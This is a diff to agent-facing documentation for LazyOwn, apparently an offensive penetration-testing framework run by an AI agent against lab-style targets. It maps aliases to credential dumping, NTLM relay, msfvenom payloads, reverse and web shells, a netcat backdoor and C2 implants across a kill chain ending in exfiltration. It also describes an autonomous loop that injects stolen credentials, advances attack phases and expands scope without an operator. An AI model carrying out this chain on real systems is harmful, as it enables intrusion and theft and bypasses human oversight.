@@ -35,27 +35,40 @@ It returns a full **SITREP** (situation report):
 
 ---
 
-## Command Abstraction Model — Critical Understanding
+## Command Abstraction Model — THE MOST IMPORTANT CONCEPT
 
 LazyOwn CLI commands are **high-level abstractions** over real security tools.
-They **automatically inject** values from `payload.json` — you NEVER write raw tool commands.
+They **automatically inject** ALL values from `payload.json` — **you NEVER write raw tool commands or flags.**
 
 ```
-payload.json  ──► LazyOwn CLI command ──► real underlying tool + full optimized flags
-     rhost              nmap               nmap -sC -sV -p- -T4 --script vuln 10.10.11.5
-     domain             ww                 whatweb http://target.htb -a 3
-     domain             dig                dig @10.10.11.5 target.htb axfr
-     rhost+wordlist     gobuster           gobuster dir -u http://10.10.11.5 -w /path/wordlist
-     rhost+creds        psexec             impacket-psexec user:pass@10.10.11.5
-     domain+creds       bh                 bloodhound-python -d target.htb -u user ...
-     rhost+creds        evil               evil-winrm -i 10.10.11.5 -u user -p pass
+payload.json  ──► LazyOwn abstract command ──► real underlying tool + full optimized flags
+     rhost              lazynmap           nmap -sC -sV -p- -T4 -Pn --script vuln {rhost}
+     domain             ww                 whatweb http://{domain} -a 3 --color never
+     rhost+domain       dig                dig @{rhost} {domain} axfr
+     rhost+dirwordlist  gobuster           gobuster dir -u http://{rhost} -w {dirwordlist} -t 30
+     rhost+creds        psexec             impacket-psexec {user}:{pass}@{rhost}
+     domain+creds       bloodhound         bloodhound-python -d {domain} -u {user} -p {pass} -c All
+     rhost+creds        evil               evil-winrm -i {rhost} -u {user} -p {pass}
+     rhost+domain+creds secretsdump        impacket-secretsdump {domain}/{user}:{pass}@{rhost}
+     query              ss                 searchsploit+NVD+ExploitAlert+PacketStorm+MSF+Pompem+creds_py
+     rhost+lhost+lport  venom              msfvenom -p <auto> LHOST={lhost} LPORT={lport} -f exe
 ```
 
-**Workflow:**
-1. Set config: `lazyown_set_config(key='rhost', value='10.10.11.5')`
-2. Discover commands for your phase: `lazyown_discover_commands(phase='recon')`
-3. Get docs for a command: `lazyown_command_help(command='lazynmap')`
-4. Run the abstract command: `lazyown_run_command('nmap')`
+**Standard workflow (always follow this):**
+```python
+# 1. Set active target
+lazyown_set_config(key='rhost', value='10.10.11.5')
+lazyown_set_config(key='domain', value='target.htb')
+
+# 2. Get FULL guide for current phase — includes commands + payload keys + aliases
+lazyown_phase_guide(phase='recon')
+
+# 3. Get help for a specific command
+lazyown_command_help(command='lazynmap')
+
+# 4. Run the abstract command — payload.json injects everything
+lazyown_run_command('lazynmap')   # NOT: nmap -sC -sV -p- 10.10.11.5
+```
 
 **Kill chain (11 phases):**
 `recon → enum → exploit → postexp → persist → privesc → cred → lateral → exfil → c2 → report`
@@ -64,7 +77,131 @@ Only use commands from the CURRENT phase. Don't run post-exploitation tools duri
 
 ---
 
-## Core MCP Tools (92)
+## Complete Alias Table — All Short Forms
+
+The shell has **200+ aliases** (short forms that map to full commands):
+
+### Phase 01 — Reconnaissance
+| Alias | Expands to | Uses payload keys |
+|-------|-----------|------------------|
+| `nmap` | `lazynmap` full TCP scan | rhost |
+| `hosts_discover` | `hostdiscover.sh` sweep | startip, endip |
+| `arpscan` | `arp-scan -l` | device |
+| `ping` | ICMP TTL-based OS detection | rhost |
+| `batchnmap` | batch nmap over range | startip, endip |
+| `discovery` | `lazynmapdiscovery` service scan | rhost |
+| `spiderfoot` | spiderfoot on 127.0.0.1:2222 | — |
+
+### Phase 02 — Scanning & Enumeration
+| Alias | Expands to | Uses payload keys |
+|-------|-----------|------------------|
+| `ww` | `whatweb` | domain |
+| `gobuster` | dir/dns/vhost brute-force | rhost, domain, wordlist |
+| `ffuf` | fast web fuzzer | rhost, url |
+| `nikto` | web vuln scanner | rhost |
+| `dirsearch` | directory search | rhost, dirwordlist |
+| `dnsenum` | DNS zone transfer + brute | domain, dnswordlist |
+| `dig` | DNS records / zone transfer | rhost, domain |
+| `enum4linux` | SMB/LDAP enumeration | rhost |
+| `cme` | crackmapexec smb | rhost, domain, start_user, start_pass |
+| `nxcridbrute` | NetExec RID cycling | rhost |
+| `ldapdomaindump` | LDAP full dump | rhost, domain, start_user, start_pass |
+| `finalrecon` | web recon all-in-one | rhost, url |
+| `gospider` | web crawler | url |
+| `ss <term>` | multi-source exploit search (9 sources) | query |
+| `get_all_domains` | crt.sh subdomain discovery | domain |
+
+### Phase 03 — Exploitation
+| Alias | Expands to | Uses payload keys |
+|-------|-----------|------------------|
+| `sqlmap` | SQL injection testing | url, method, data |
+| `venom` | `msfvenom` payload generator | lhost, lport, os_id |
+| `msf` | metasploit multi/handler | lhost, lport |
+| `commix` | command injection | url |
+| `wfuzz` | web fuzzing | url, wordlist |
+| `launchpad` | Launchpad package search | query |
+
+### Phase 04 — Post-Exploitation
+| Alias | Expands to | Uses payload keys |
+|-------|-----------|------------------|
+| `creds` | `cat sessions/credentials*` | — |
+| `hash` | `cat sessions/hash*` | — |
+| `loot` | copy msf loot to sessions/ | — |
+| `ssh_cmd` | SSH command execution | rhost, start_user, start_pass |
+| `scp` | SCP file transfer | rhost, start_user, start_pass |
+| `py3ttyup` | Python TTY upgrade one-liner | — |
+
+### Phase 05 — Persistence
+| Alias | Expands to | Uses payload keys |
+|-------|-----------|------------------|
+| `createwebshell` | web shell generator | lhost, lport |
+| `createrevshell` | reverse shell generator | lhost, lport |
+| `lazywebshell` | launch web shell server | lhost, lport |
+
+### Phase 06 — Privilege Escalation
+| Alias | Expands to | Uses payload keys |
+|-------|-----------|------------------|
+| `linpeas` | linpeas.sh (via adversary_yaml) | rhost |
+| `winpeas` | winpeas.exe (via adversary_yaml) | rhost |
+| `getcap` | `getcap -r /` | — |
+| `lazypwn` | LazyPwn exploit script | rhost |
+| `fixperm` | fix shell file permissions | — |
+
+### Phase 07 — Credential Access
+| Alias | Expands to | Uses payload keys |
+|-------|-----------|------------------|
+| `secretsdump` | impacket-secretsdump | rhost, domain, start_user, start_pass |
+| `getnpusers` | GetNPUsers (AS-REP roast) | rhost, domain |
+| `hashcat` | hashcat GPU cracking | wordlist |
+| `john2hash` | john password cracking | wordlist |
+| `unshadow` | combine /etc/passwd + shadow | — |
+| `responder` | LLMNR/NBT-NS poisoning | device, lhost |
+| `ntlmrelayx` | NTLM relay to target | rhost, domain, lhost |
+
+### Phase 08 — Lateral Movement
+| Alias | Expands to | Uses payload keys |
+|-------|-----------|------------------|
+| `evil` | `evil-winrm` | rhost, start_user, start_pass |
+| `psexec` | impacket-psexec | rhost, start_user, start_pass |
+| `cme` | crackmapexec | rhost, domain, start_user, start_pass |
+| `bloodhound` | bloodhound-python collector | rhost, domain, start_user, start_pass |
+| `coerce_plus` | coercion via netexec | rhost, domain, start_user, start_pass, lhost |
+| `smbclient` | SMB interactive | rhost, start_user, start_pass |
+
+### Phase 10 — Command & Control
+| Alias | Expands to | Uses payload keys |
+|-------|-----------|------------------|
+| `cc` | open C2 Firefox dashboard | lhost, c2_port |
+| `download_c2` | pull C2 implant | lhost, c2_port |
+| `msf` | metasploit handler | lhost, lport |
+| `backdoor` | nc to rhost:31337 | rhost |
+
+### Phase 11 — Reporting
+| Alias | Expands to | Uses payload keys |
+|-------|-----------|------------------|
+| `report` | `python3 report.py` with GROQ_API_KEY | api_key |
+| `man` | `cat README.md | gum format` | — |
+
+---
+
+## Phase Command Discovery — 3 Ways
+
+```python
+# 1. FULL phase guide (RECOMMENDED) — commands + payload keys + aliases + kill-chain position
+lazyown_phase_guide(phase='enum')
+lazyown_phase_guide(phase='enum', os_hint='windows', services=['smb', 'ldap'])
+
+# 2. Plain command list from bridge catalog (347 commands, 11 phases, MITRE-mapped)
+lazyown_discover_commands(phase='exploit')
+
+# 3. Get full help for any specific command
+lazyown_command_help(command='gobuster')
+lazyown_command_help(command='secretsdump')
+```
+
+---
+
+## Core MCP Tools (95)
 
 ### Campaign Intelligence (call at shift start)
 
@@ -72,6 +209,7 @@ Only use commands from the CURRENT phase. Don't run post-exploitation tools duri
 |------|---------|
 | `lazyown_campaign_sitrep` | **MASTER SITREP** — aggregates world_model + tasks + objectives + creds + lessons + daemon into one briefing |
 | `lazyown_credentials` | All captured creds from credentials*.txt + sessionLazyOwn.json + world_model — deduped table |
+| `lazyown_auto_populate` | **AUTO-POPULATE payload.json** — parse nmap XML + credentials.txt → auto-set domain/os/services/creds without operator input |
 | `lazyown_c2_notes` | Read/append/clear operational notes in sessionLazyOwn.json — shift handoff commentary |
 | `lazyown_report_update` | Read or update PDF report fields in static/body_report.json; `auto_fill` generates exec summary from session data |
 | `lazyown_campaign_lessons` | Read tactical lessons derived from campaign milestones — avoid repeating mistakes |
@@ -90,6 +228,7 @@ Only use commands from the CURRENT phase. Don't run post-exploitation tools duri
 | `lazyown_get_config` | Read current payload.json settings |
 | `lazyown_set_config` | Write a key-value pair to payload.json |
 | `lazyown_list_modules` | List modules/ contents |
+| `lazyown_phase_guide` | **FULL PHASE GUIDE** — commands + payload keys + aliases + kill-chain for a phase. Use at phase start. |
 | `lazyown_discover_commands` | List commands by pentest phase (use `phase='recon'`/`'enum'`/etc) OR all shell commands |
 | `lazyown_command_help` | Get full docs for any command: `help <command>` |
 
@@ -365,19 +504,22 @@ lazyown_set_config(key="lport", value="4444")
 
 ### 2. Recon
 
-OS detection must precede service scanning. The ping TTL identifies the platform
-so that subsequent tool selection uses the correct OS-specific chain.
+```python
+# Step 0 — Get full phase guide FIRST (commands + payload keys + aliases)
+lazyown_phase_guide(phase='recon')
 
-```
-# Step 1 — OS detection (always first)
+# Step 1 — OS detection (ALWAYS FIRST — determines entire tool chain)
 lazyown_run_command("ping")           # TTL ~64 -> Linux | TTL ~128 -> Windows
 
-# Step 2 — Network scan (do not kill early, 5-30 min)
-lazyown_run_command("lazynmap")       # full TCP scan
-lazyown_run_command("hosts_discover")
+# Step 2 — Network scan (do NOT kill early, 5-30 min)
+lazyown_run_command("lazynmap")       # → nmap -sC -sV -p- -T4 -Pn --script vuln {rhost}
+lazyown_run_command("hosts_discover") # → hostdiscover.sh sweep
 
-# Step 3 — Parse findings
+# Step 3 — Parse findings automatically
 lazyown_facts_show(target="10.10.11.78", refresh=True)
+
+# Step 4 — Reactive analysis of output → next priority action
+lazyown_reactive_suggest(output="<nmap output>", command="lazynmap", platform="linux")
 ```
 
 The autonomous daemon performs OS detection automatically before the first
@@ -1048,12 +1190,56 @@ tools list               — list custom pwntomate .tool files
 # 1. Recon (inform user this is long-running)
 lazyown_run_command("lazynmap")
 
-# 2. Once scan XML exists, pwntomate runs automatically via auto_loop
+# 2. Auto-populate payload.json from the XML output (NEW — no manual operator step)
+lazyown_auto_populate(target="10.10.11.5")
+# → Sets domain, os_id, services, start_user/start_pass automatically
+
+# 3. Once scan XML exists, pwntomate runs automatically via auto_loop
 #    or manually: python3 pwntomate.py sessions/scan_<rhost>.nmap.xml -x -b sessions/ -t tools/
 
-# 3. Incremental results via FactStore
+# 4. Incremental results via FactStore
 lazyown_facts_show(target="<rhost>", refresh=True)
 ```
+
+---
+
+## Autonomous Loop — Self-Healing Behaviours (v0.2.97+)
+
+Three autonomy gaps were closed in release/0.2.97. These run **automatically inside the daemon** — no operator action needed:
+
+### 1. Credential Auto-Injection
+When `ObsParser` extracts a `CREDENTIAL` finding (`user:pass`) from tool output:
+- `start_user` and `start_pass` are written to **payload.json** immediately
+- The credential is appended to `sessions/credentials.txt`
+- A `CREDENTIAL_FOUND` event is emitted — visible in `lazyown_autonomous_events()`
+- All subsequent commands that need auth will use the discovered credential automatically
+
+**Impact:** Eliminates the main lateral movement blocker — no operator needed to manually set credentials.
+
+### 2. Domain + Hash Auto-Injection
+Same ObsParser pass also writes:
+- `DOMAIN` finding → `payload.json["domain"]` (if not already set)
+- `HASH` finding → `payload.json["hash"]` (if not already set)
+- `USERNAME` finding → `payload.json["start_user"]` (fallback if no full credential)
+
+### 3. nmap XML Auto-Populate
+After any `lazynmap`/`nmap`/`rustscan`/`masscan` command, the daemon:
+- Parses `sessions/scan_{rhost}.nmap.xml`
+- Extracts **domain** from `<hostname>` entries
+- Lists all **open services** → feeds into next command selection context
+- Extracts **OS match** → sets `os_id` in payload.json
+- Logs any **additional hosts** found for scope expansion
+
+Also callable on-demand: `lazyown_auto_populate(target="10.10.11.5")`
+
+### 4. Stuck-Loop Recovery
+When all 6 selectors fall through to `"list"` command **3 consecutive times**:
+- A `STUCK_LOOP` event is emitted
+- The loop **auto-advances** to the next pentest phase (recon → enum → exploit → ...)
+- `_fail_counts` is reset so bridge/parquet selectors get fresh candidates
+- No manual intervention required
+
+**Phase order:** recon → enum → exploit → postexp → persist → privesc → cred → lateral → exfil → c2 → report
 
 ---
 
